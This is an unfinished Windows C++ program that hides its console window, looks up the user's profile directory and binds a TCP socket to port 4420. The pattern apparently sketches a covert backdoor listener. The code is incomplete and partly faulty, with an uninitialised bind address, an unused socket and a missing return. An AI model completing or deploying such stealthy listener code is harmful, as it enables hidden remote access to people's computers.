#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string>


char* userDirectory() {
    char* pPath;
    pPath = getenv("USERPROFILE");

    if (pPath!=NULL) {
        return pPath;
    }
    else {
        perror("");
    }
}


int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    WSAStartup(MAKEWORD(2, 0), &WSAData);
    server = socket(AF_INET, SOCK_STREAM, 0);
	int port = 4420; // accept port # 

        // socket and binding 
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        //holds the socket info 
        struct sockaddr_in address;
        address.sin_family = AF_INET;
        address.sin_port = htons(port);
        //bind 
        int bind_value = bind(sock, (struct sockaddr*)&address, sizeof(address));

        if (bind_value < 0) {
            perror("some error here");
            return 1;
        }
    
	}





